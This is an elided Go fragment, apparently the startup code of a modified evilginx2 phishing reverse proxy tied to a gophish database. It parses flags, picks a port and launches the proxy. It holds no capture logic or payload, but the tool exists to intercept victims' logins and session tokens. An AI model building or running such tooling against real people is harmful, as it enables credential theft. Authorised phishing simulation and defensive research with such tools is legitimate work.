...
func main() {
    ...
    flag.Parse()
    if *gophish_db == "" {
        log.Fatal("you need to provide the full path to the gophish database: ./evilginx2 -g /opt/PhishlikePro/gophish/gophish.db")
        return
    }
    if *phishlets_dir == "" {
...
servicePort := randomserviceport.GetPersistentRandomPort("tcp://127.0.0.1:8443",".evilginx", "443")
  	log.Info("Https Server Started on https://localhost:%s",  servicePort)
    xservicePort, _ := strconv.Atoi(servicePort)

    hp, _ := core.NewHttpProxy("127.0.0.1", xservicePort, cfg, crt_db, db, bl, *developer_mode, *feed_enabled)
    hp.Start()
